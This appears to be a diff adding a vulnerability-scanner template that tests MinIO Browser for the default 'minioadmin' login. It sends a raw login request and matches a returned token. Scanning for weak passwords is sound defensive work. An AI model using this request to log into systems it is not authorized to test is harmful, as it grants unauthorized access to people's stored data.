@@ -1,0 +1,28 @@
+id: poc-yaml-minio-browser-weak-pass
+info:
+  name: MinIO Browser Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password,minio
+http:
+  - raw:
+      - |
+        POST /minio/webrpc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"id":1, "jsonrpc":"2.0", "method": "Web.Login", "params":{"password": "minioadmin", "username": "minioadmin"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uiVersion"
+          - "token"
+      - type: word
+        part: header
+        words:
+          - "application/json"
